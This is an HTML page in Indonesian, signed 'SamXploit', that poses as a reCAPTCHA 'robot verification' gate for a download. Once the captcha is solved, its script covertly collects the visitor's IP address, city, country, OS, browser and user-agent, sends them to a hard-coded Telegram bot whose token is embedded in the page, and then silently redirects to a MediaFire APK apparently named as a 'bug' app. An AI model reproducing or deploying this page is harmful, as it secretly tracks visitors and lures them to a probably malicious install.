<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifikasi Robot</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #ffffff;
      color: #000000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }

    .box {
      background: rgba(0, 0, 0, 0.03);
      backdrop-filter: blur(8px);
      border-radius: 12px;
      padding: 30px;
      max-width: 450px;
      width: 90%;
      box-shadow: 0 0 15px rgba(0,0,0,0.15);
    }

    button {
      margin-top: 20px;
      padding: 12px 25px;
      font-size: 16px;
      font-weight: bold;
      background: #003366;
      border: none;
      color: white;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s;
      display: none;
    }

    button:hover {
      background: #002244;
    }

    .footer {
      position: absolute;
      bottom: 10px;
      font-size: 13px;
      opacity: 0.6;
      width: 100%;
      color: #333;
    }
  </style>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>

  <div class="box">
    <h2>🔐 Verifikasi Diperlukan</h2>
    <p>Silakan verifikasi di bawah untuk melanjutkan ke halaman download.</p>
    <div class="g-recaptcha" data-sitekey="6LdeHZArAAAAAFZT1atO2lPapq8V_sSs0nKE1Uba" data-callback="verifikasi"></div>
  </div>

  <div class="footer">
    © 2025 SamXploit | reCAPTCHA v2
  </div>

  <script>
    async function verifikasi() {
      try {
        const geo = await fetch('https://ipapi.co/json/')
          .then(res => res.json())
          .catch(() => ({}));

        const ip = geo.ip || '-';
        const negara = geo.country_name || '-';
        const kota = geo.city || '-';
        const userAgent = navigator.userAgent;
        const os = navigator.platform || '-';
        const browser = getBrowser();

        const pesan = `🤖 *Verifikasi Robot Berhasil!*\n\n🌐 *IP:* ${ip}\n🏙 *Kota:* ${kota}\n🌍 *Negara:* ${negara}\n💻 *OS:* ${os}\n🌐 *Browser:* ${browser}\n📱 *User-Agent:* ${userAgent}`;

        const BOT_TOKEN = '8072851009:AAHDsHyz5EgG2ThhEFAp_1QR1tQAQgcFr4M';
        const CHAT_ID = '7625804862';

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: pesan,
            parse_mode: 'Markdown'
          })
        });
      } catch (e) {
        // Error kirim data? lanjut aja
      } finally {
        // Redirect ke halaman MediaFire tanpa notifikasi
        window.location.href = "https://www.mediafire.com/file/49m97ugah1hwwqp/Apk_Bug_SamsInfinity_v1.0%25281%2529_%25284%2529.apk/file";
      }
    }

    function getBrowser() {
      const ua = navigator.userAgent;
      if (ua.indexOf("Chrome") !== -1) return "Chrome";
      if (ua.indexOf("Firefox") !== -1) return "Firefox";
      if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) return "Safari";
      if (ua.indexOf("Edge") !== -1) return "Edge";
      if (ua.indexOf("Opera") !== -1 || ua.indexOf("OPR") !== -1) return "Opera";
      return "Lainnya";
    }
  </script>

</body>
</html>
